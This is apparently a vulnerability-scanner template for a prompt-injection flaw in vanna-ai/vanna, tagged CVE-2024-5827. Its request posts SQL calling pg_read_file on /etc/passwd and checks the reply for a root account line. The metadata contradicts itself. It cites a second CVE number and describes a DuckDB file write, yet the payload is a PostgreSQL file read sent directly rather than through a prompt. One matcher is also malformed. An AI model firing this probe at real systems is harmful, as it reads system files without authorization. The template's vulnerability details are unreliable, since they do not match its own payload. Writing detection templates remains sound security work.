id: CVE-2024-5827
info:
  name: "Arbitrary File Write by Prompt Injection (CVE-2024-5827)"
  author: shlee, nukunga123, harksu, taekwoo, gy741
  severity: "high"
  description: "Arbitrary File Write by Prompt Injection via DuckDB SQL in vanna-ai/vanna (CVE-2023-6977)."
  tags: command-execution, sql, cve, prompt-injection

requests:
  - raw:
      - |
        POST /sql HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"sql": "SELECT pg_read_file('/etc/passwd', 0, 1000);"}

    matchers:
      - type: dsl
        dsl:
          - "Content-Type: application/json"

      - type: status
        status:
          - 200

      - type: regex
        regex:
          - "root:[^:]*:0:0"
        part: body
